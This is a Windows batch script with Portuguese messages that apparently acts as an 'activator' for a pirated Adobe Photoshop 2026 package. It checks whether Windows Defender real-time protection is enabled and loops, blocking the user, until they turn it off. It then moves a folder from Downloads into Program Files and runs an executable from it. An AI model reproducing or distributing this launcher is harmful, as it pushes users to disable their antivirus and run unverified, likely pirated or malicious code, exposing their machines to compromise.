:again
@echo off

set defender=0

for /f %%i in ('powershell -NoProfile -Command "(Get-MpComputerStatus).RealTimeProtectionEnabled"') do (
    if /i "%%i"=="True" set defender=1
)

if "%defender%"=="1" (
color 4f
echo                !!!!
echo             !!!!!!!!!!
echo          !!!!!!!!!!!!!!!!
echo       !!!!!!!!!!!!!!!!!!!!!!
echo    !!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !!!DESATIVE O DEFENDER PRIMEIRO!!!
echo    !!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo       !!!!!!!!!!!!!!!!!!!!!!
echo          !!!!!!!!!!!!!!!!
echo             !!!!!!!!!!
echo                !!!!

timeout 2 /nobreak >null
start windowsdefender://threat/

echo                    ::
echo                    ::
echo                    ::
echo                    ::
echo                 \      /
echo                  \    /
echo                   \  /
echo                    \/
echo ==========================================
echo PRESSIONE QUALQUER TECLA E TENTE NOVAMENTE
echo ==========================================
pause >null
cls
goto again
)

timeout 1 /nobreak 

goto ativador
:ativador

move /y "C:\Users\%username%\Downloads\Temp" "C:\Program Files\"
ren "C:\Program Files\Temp" Adobe
timeout 3
start "" "C:\Program Files\Adobe\Adobe Photoshop 2026 v27.0 (x64)\Setup\autoplay.exe"

timeout 1 /nobreak 

color a

echo ---------------------
echo ------RELATORIO------
echo ---------------------
cd /d "C:\Program Files\Adobe\"
dir /b
echo ---------------------

timeout 5

exit
